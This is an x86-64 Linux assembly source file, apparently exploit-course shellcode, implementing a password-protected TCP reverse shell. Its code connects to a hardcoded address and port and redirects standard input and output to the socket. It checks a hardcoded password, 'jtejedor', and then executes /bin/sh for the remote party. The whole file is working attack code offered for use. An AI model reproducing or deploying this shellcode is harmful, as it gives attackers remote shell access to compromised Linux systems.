;TCP-Reverse-Shell Linux x86_64
;author Javier Tejedor
;date 06-10-2014

global _start

_start:

	; create socket	
	; int socket(int domain, int type, int protocol); 
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41 
	xor rax, rax
	xor rdi, rdi
	xor rsi, rsi
	push 41
	pop rax
	add rdi, 2
	add rsi, 1
	syscall

	; copy socket descriptor to rdi for future use 
	mov rdi, rax

	; server.sin_family = AF_INET 
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = inet_addr("127.0.0.1")
	; bzero(&server.sin_zero, 8)
	xor rax, rax 
	
	push rax
	mov ebx, 0x12111190
	sub ebx, 0x11111111	
	mov dword [rsp-4], ebx
	mov word [rsp-6], 0x0a1a
	xor ebx, ebx
	mov bl, 2
	mov word [rsp-8], bx
	sub rsp, 8


	; connect(socket, (struct sockaddr *)&sin, sizeof(struct sockaddr));
	; syscall number 42
	mov al, 42
	mov rsi, rsp
	xor rdx, rdx
	push 16
	pop rdx
	syscall

	; duplicate sockets
        ; dup2 (new, old)
	xor rbx, rbx
	mov bl, 3	

generate_dups:
        xor rax, rax
	mov al, 33	
	sub rbx, 1
	mov rsi, rbx
        syscall
	jne generate_dups

	; send data to ask for a password
	; send(newSocket, "Password", 8, 0);
	; syscall number 44
	xor rax, rax
	xor rdx, rdx
	xor r10, r10
	push 44
	pop rax
	mov rbx, 0x64726f7773736150
	push rbx
	mov rsi, rsp
	push 8
	pop rdx
	syscall
        
	; receive data from attacker machine
	; recv(newSocket, passwd, 8, 0); 
	; syscall number 45
	xor rax, rax
	push 45
	pop rax
	sub rsp, 16	;password 16 bytes lenght
	mov rsi, rsp
	push 16
	pop rdx
	syscall
	
	; checks if the password is correct, send the shell
	mov rax, 0x726f64656a65746a ;password: jtejedor 
	lea rdi, [rel rsi]
	scasq
	;if is correct send the shell
	jz send_shell 

	;exit
	push 60
	pop rax
	syscall

send_shell:

        ; execve
        ; First NULL push
        xor rax, rax
        push rax

        ; push /bin//sh in reverse
        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI
        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp

        ; Push address of /bin//sh
        push rdi

        ; set RSI
        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall
